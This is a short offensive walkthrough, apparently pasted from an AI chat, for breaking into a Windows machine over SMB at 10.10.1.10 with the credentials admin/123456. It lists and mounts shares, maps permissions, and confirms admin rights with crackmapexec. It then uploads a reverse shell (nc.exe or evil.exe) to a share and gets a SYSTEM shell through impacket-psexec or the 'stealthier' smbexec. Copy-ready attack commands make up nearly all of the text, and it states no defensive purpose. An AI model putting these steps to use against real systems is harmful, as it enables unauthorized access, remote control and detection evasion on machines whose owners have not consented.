### 🔹 Step 1: List Available Shares

bash

CopiarEditar

`smbclient -L \\\\10.10.1.10 -U admin%123456`

> Look for shares like:
> 
> - `C$` (admin)
>     
> - `Users`
>     
> - `Shared`
>     
> - `IPC$` (not useful)
>     
> - Anything custom
>     

---

### 🔹 Step 2: Connect to a Share

Once you find a share:

bash

CopiarEditar

`smbclient \\\\10.10.1.10\\SHARENAME -U admin%123456`

You’ll get a prompt like `smb: \>`.

### 🔸 Useful Commands in smbclient:

bash

CopiarEditar

`ls               # list files cd foldername    # change directory get file.txt     # download file put shell.exe    # upload a file`

---

### 🔹 Step 3: Recursively Enumerate with smbmap

bash

CopiarEditar

`smbmap -H 10.10.1.10 -u admin -p 123456`

This gives a full tree view of file permissions and accessible directories.

---

### 🔹 Step 4: Use crackmapexec to Check Privileges

bash

CopiarEditar

`crackmapexec smb 10.10.1.10 -u admin -p 123456`

Look for:

nginx

CopiarEditar

`SMB         10.10.1.10      445    DESKTOP-X    [+] admin:123456 (Pwn3d!)`

If you see `(Pwn3d!)` — you likely have full admin access.

---

## 🧨 Bonus: Upload and Execute Reverse Shell

If you can **write to a share** and have **command execution access** (e.g., via scheduled task, service abuse, or RPC), upload a reverse shell (e.g., `nc.exe`, `evil.exe`), and:

1. Upload shell:
    

bash

CopiarEditar

`smbclient \\\\10.10.1.10\\SHARENAME -U admin%123456 put nc.exe`

2. Trigger execution (via RCE method — needs context).
    

---

## 🚀 Next Steps (If Admin on SMB)

If CrackMapExec says `Pwn3d!`, try:

### 🛠️ `impacket-psexec`:

bash

CopiarEditar

`impacket-psexec admin:123456@10.10.1.10`

> Gives direct SYSTEM shell over SMB.

Or:

### ⚙️ `impacket-smbexec` (slightly stealthier):

bash

CopiarEditar

`impacket-smbexec admin:123456@10.10.1.10`